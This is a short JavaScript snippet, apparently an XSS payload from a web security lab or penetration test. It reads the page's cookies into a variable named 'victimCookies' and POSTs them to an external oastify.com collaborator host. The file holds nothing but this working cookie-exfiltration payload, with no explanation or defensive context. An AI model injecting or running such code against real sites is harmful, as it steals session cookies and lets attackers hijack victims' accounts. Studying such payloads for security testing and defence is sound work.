var victimCookies=document.cookie
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://oqi2v0214z5gr1j7y253v6friio9cz0o.oastify.com", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    var response = xhr.responseText;
    console.log(response);
    // Process the response data here
  } else if (xhr.readyState === 4) {
    console.log('Request failed with status code:', xhr.status);
    // Handle any errors that occur during the request
  }
};

var requestBody = "cookies=" + victimCookies;
xhr.send(requestBody);
